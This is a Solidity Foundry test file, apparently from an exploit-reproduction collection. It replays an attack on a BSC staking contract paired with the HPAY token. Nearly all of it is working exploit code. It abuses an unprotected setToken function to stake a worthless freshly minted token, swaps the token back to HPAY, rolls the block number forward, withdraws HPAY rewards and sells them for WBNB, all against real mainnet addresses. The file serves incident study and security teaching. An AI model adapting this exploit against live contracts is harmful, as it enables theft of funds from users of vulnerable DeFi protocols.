//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/Supremacy_CA/status/1582345448190140417
// @Address
// https://bscscan.com/address/0xab74fbd735cd2ed826b64e0f850a890930a91094

interface MintableAutoCompundRelockBonus{
    function setToken(address) external;
    function stake(uint256) external;
    function withdraw(uint256) external;
}

contract ContractTest is DSTest{
    
    IERC20 HPAY = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
    IERC20 WBNB =IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    MintableAutoCompundRelockBonus Bonus = MintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22280853); 
    }

    function testExploit() external{
        HPAY.approve(address(Router), type(uint).max);
        // fake token deposit
        SHITCOIN shitcoin = new SHITCOIN();
        shitcoin.mint(100_000_000 * 1e18);
        shitcoin.approve(address(Bonus), type(uint).max);
        Bonus.setToken(address(shitcoin));
        Bonus.stake(shitcoin.balanceOf(address(this)));
        Bonus.setToken(address(HPAY));
        // change block.number
        cheats.roll(block.number + 1000);
        // withdraw reward token
        Bonus.withdraw(30_000_000 * 1e18);
        HPAYToWBNB();

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    function HPAYToWBNB() internal {
        address [] memory path = new address[](2);
        path[0] = address(HPAY);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HPAY.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

contract SHITCOIN {
    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    function transfer(address recipient, uint amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}